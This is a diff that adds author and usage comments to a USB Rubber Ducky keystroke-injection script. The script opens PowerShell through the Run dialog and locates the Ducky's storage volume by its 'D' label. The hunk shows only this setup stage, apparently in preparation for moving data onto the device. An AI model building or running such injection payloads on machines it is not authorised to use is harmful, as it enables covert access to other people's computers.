@@ -1,3 +1,7 @@
+REM Made By: DeDogeGod
+REM Works for all devices with powershell
+REM Make sure to read all comments!
+REM Change Delays acording to your computer. These delays were for a lenova yoga 2 64 bit slowed.
 DELAY 1000
 GUI R
 DELAY 200
@@ -5,6 +9,7 @@ STRING powershell
 DELAY 200
 ENTER
 DELAY 700
+REM -----------------------------------         I recomend using D as your duckys name but you can change it.
 STRING $usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'D' } | select name
 DELAY 200
 ENTER
